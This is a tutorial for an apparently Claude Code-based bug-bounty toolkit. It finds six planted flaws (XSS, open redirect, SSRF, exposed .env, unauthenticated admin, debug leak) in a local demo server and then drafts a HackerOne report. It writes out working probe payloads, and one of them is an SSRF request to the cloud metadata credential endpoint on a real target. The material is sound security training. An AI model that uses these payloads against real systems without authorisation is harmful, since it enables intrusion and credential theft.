# A → Z Tutorial — Finding Real Bugs with the bughunter.fun Toolkit

This is the short, record-it-once walkthrough that takes you from
zero to a submission-ready report.

You will:

1. Install the toolkit
2. Spin up a deliberately-vulnerable demo target (a shuvonsec.me lookalike)
3. Find 6 real bugs in it
4. Validate the highest-impact one
5. Generate a HackerOne-format report

**Total runtime:** ~5 minutes. Recommended terminal width: ≥ 100 cols.

---

## Prerequisites

| Thing       | Why                                    | How                          |
|-------------|----------------------------------------|------------------------------|
| Python 3.10+ | Tool + demo target are stdlib only    | `python3 --version`          |
| `git`       | Cloning the repo                       | `git --version`              |
| `curl`      | Manual verification of each bug        | preinstalled on macOS/Linux  |
| **Optional**: `nuclei`, `httpx`, `ffuf`, `katana` | Speed up scanning when available | `./tools/external_arsenal.sh` |

The demo target needs **zero external tools**. The toolkit picks the strongest
scanner available and skips the rest gracefully.

---

## A. Install (30 sec)

```bash
git clone https://github.com/shuvonsec/claude-bug-bounty.git
cd claude-bug-bounty
chmod +x install.sh && ./install.sh
```

That copies the skills, commands, and agents into `~/.claude/` so the slash
commands (`/recon`, `/hunt`, `/validate`, `/report`) show up next time you
open Claude Code.

## B. Verify the arsenal (15 sec)

```bash
bash tools/external_arsenal.sh
```

You'll see the **BUGHUNTER** banner, then a table of ~50 external tools with
their install status. Green rows are ready; red rows just print an install
hint. **Nothing red blocks the rest of the tutorial** — the demo works on
stdlib alone.

## C. Start the vulnerable demo target (10 sec)

In a **second terminal**, run:

```bash
python3 serve.py
```

Output:

```
  Serving on http://127.0.0.1:8080  (Ctrl+C to stop)
```

Visit `http://127.0.0.1:8080/` in your browser — the page is a small
**shuvonsec.me — Personal Security Lab** landing screen. That's the target.

> Bound to `127.0.0.1` only. Set `SHUVONSEC_QUIET=1` (default in `serve.py`)
> to suppress the toolkit banner; clear it if you want the banner in-shot.

---

## D. Recon (60 sec)

Recon is about **discovering attack surface**. Real targets get the full
`tools/recon_engine.sh` treatment (subdomain enum + URL crawl + tech
fingerprint + nuclei sweep). For our localhost target there's no DNS to
enumerate, so we go straight to the URL surface.

```bash
curl -s http://127.0.0.1:8080/robots.txt
```

Output:

```
User-agent: *
Disallow: /admin
Disallow: /backup/
Disallow: /.env
Disallow: /api/debug
```

That single file just leaked four interesting endpoints. Add `/search`
(from the landing page form) and `/go`, `/fetch` (visible navigation) and
you have your **attack surface**:

```
/search?q=
/go?url=
/fetch?url=
/.env
/admin
/api/debug
```

> Pro tip: the real recon engine extracts the same list via `katana` + `gau`
> + `waybackurls`. For real targets:
> ```bash
> bash tools/recon_engine.sh target.com
> ```

---

## E. Hunt — find each bug (2 min)

We'll probe each endpoint with a single `curl` and note the verdict. In a
real engagement you'd run `bash tools/vuln_scanner.sh recon/target` instead
of doing it by hand — that's the same probes, batched.

### 1. Reflected XSS — `/search?q=`

```bash
curl -s "http://127.0.0.1:8080/search?q=<script>alert(1)</script>" | grep -i script
```

Expected:

```html
<h2>Results for: <script>alert(1)</script></h2>
```

The payload comes back inside the HTML body **unescaped**. That's reflected
XSS, **High** severity.

### 2. Open redirect — `/go?url=`

```bash
curl -s -o /dev/null -w "HTTP %{http_code}  Location: %{redirect_url}\n" \
  "http://127.0.0.1:8080/go?url=https://evil.example"
```

Expected:

```
HTTP 302  Location: https://evil.example/
```

The server happily redirects to any external host — perfect phishing primitive,
chain it into an OAuth flow and you have account takeover. **Medium** standalone,
**Critical** when chained.

### 3. SSRF — `/fetch?url=`

```bash
curl -s "http://127.0.0.1:8080/fetch?url=http://127.0.0.1:8080/.env" | head -3
```

Expected:

```
APP_NAME=shuvonsec.me
DB_HOST=db.internal.shuvonsec.me
DB_USER=admin
```

The server fetched a URL **on our behalf** with no allowlist. On AWS that's
one request from stealing IAM creds:

```bash
# What you'd run on a real AWS-hosted target:
curl "http://target.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
```

**Critical** in a cloud environment.

### 4. Exposed secrets file — `/.env`

```bash
curl -s http://127.0.0.1:8080/.env
```

Expected:

```
APP_NAME=shuvonsec.me
DB_PASSWORD=hunter2-super-secret
AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE
AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
JWT_SIGNING_KEY=please-rotate-me-prod-2025
```

A live AWS key and the JWT signing secret. **This is the bug we'll
validate and report** — the highest-impact one. **Critical**.

### 5. Unauthed admin — `/admin`

```bash
curl -s -o /dev/null -w "HTTP %{http_code}\n" http://127.0.0.1:8080/admin
```

Expected: `HTTP 200`. No auth, no session, no CSRF token. **High**.

### 6. Debug info disclosure — `/api/debug`

```bash
curl -s http://127.0.0.1:8080/api/debug | head -10
```

Expected JSON dump with version, host, port, env vars, and **feature flags**
(`beta_admin: true` — a hint there's more admin surface to find). **Medium**.

---

## F. Validate the .env leak (60 sec)

Six findings is too many to report at once — pick the most-paid one. We'll
run the validator against the .env exposure:

```bash
python3 tools/validate.py --program shuvonsec-demo
```

The validator walks you through the **4-gate checklist** and **CVSS 3.1**
scoring. Sample answers for this bug:

| Gate          | Answer                                                                 |
|---------------|------------------------------------------------------------------------|
| Is it real?   | Yes — reproducible with one curl                                       |
| In scope?     | Yes — main webapp, no exclusion                                        |
| Exploitable?  | Yes — AWS key + JWT secret = immediate full compromise                 |
| Not a dup?    | Confirmed by searching the program's Hacktivity (none for `/.env`)     |
| Vuln type     | "Sensitive Information Disclosure"                                     |
| Endpoint      | `/.env`                                                                |

It writes a report skeleton (`findings/<vuln>-<endpoint>.md`) with CVSS
metrics already filled in.

## G. Generate the report (30 sec)

If you're inside Claude Code, the fastest path is the `/report` slash command —
it picks the right template (HackerOne / Bugcrowd / Intigriti / Immunefi),
applies the human-tone rules from `skills/report-writing/`, and outputs a
submission-ready markdown file:

```
/report
```

When asked, paste the skeleton from step F and tell it the program is
HackerOne. The output is **submission-ready** — title, summary, steps to
reproduce, impact, suggested fix, CVSS vector, and references.

If you prefer a one-shot CLI:

```bash
# Treat the skeleton as your draft; final polish happens in /report.
$EDITOR findings/sensitive-disclosure-env.md
```

---

## H. Tear down (5 sec)

```bash
# In the server terminal:
Ctrl+C
```

That's it — nothing is persisted to disk. Re-run `python3 serve.py` any
time you want to repeat the walkthrough.

---

## Recap — the 6-step loop you'll use on real targets

```
1.  /scope <program>          # confirm what you're allowed to touch
2.  /recon target.com         # subdomain + URL surface
3.  /hunt target.com          # vuln scanner over the recon output
4.  /validate                 # 4-gate checklist + CVSS
5.  /report                   # H1/Bugcrowd-ready submission
6.  /remember                 # log the finding to hunt memory
```

Same banner, same workflow line, every step.

## Where to go next

- `bash tools/external_arsenal.sh --install-hint <tool>` to add scanners
  the demo skipped (nuclei, ffuf, dalfox — see the install table).
- `/scope-aggregate <program>` to pull every in-scope asset across H1,
  Bugcrowd, Intigriti, YWH, and Immunefi in one shot.
- `skills/bb-methodology/SKILL.md` for the 5-phase hunting workflow
  to use between sessions.
